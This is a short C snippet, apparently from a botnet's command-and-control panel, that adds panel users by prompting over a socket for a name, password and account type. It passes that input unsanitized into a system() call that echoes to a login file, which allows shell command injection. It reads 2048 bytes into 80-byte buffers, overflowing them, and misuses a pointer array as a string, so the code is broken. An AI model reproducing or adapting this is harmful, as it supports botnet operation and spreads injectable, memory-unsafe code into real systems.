/*
An AddUser function 

Three user inputs: [InputName, InputPass, InputType]

Process the UserInput and automatically forward the responses to LoginFile, which would be 'L' by default
*/

if(strstr(buf, "adduser")) 
{
        char abuf[2048]; char *inputtosystem[50]; char InputName[80]; char InputPass[80]; char InputType[80];
    sprintf(botnet, ""white"Username:"red" ");                               /* User input for 'username' < stored to [InputName] */
    if (send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;   /* Print User Input To Server */
    if (fdgets(InputName, sizeof abuf, thefd) < 1) goto end;                 /* Process User Input */
    trim(InputName);                                                         /* Trim User Input */
 
        sprintf(botnet, "Password: ");                                         /* same as above */
    if (send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; 
    if (fdgets(InputPass, sizeof abuf, thefd) < 1) goto end;
    trim(InputPass);
 
        sprintf(botnet, "Admin or Normal account?: ");                        /* same as above */
    if (send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; 
    if (fdgets(InputType, sizeof abuf, thefd) < 1) goto end;
    trim(InputType);
 
        sprintf(inputtosystem, "echo '%s %s %s' >> L", InputName, InputPass, InputType);  /* Take User Input For Username, Password, AccountType */
    system(inputtosystem); /* Run Command */
}
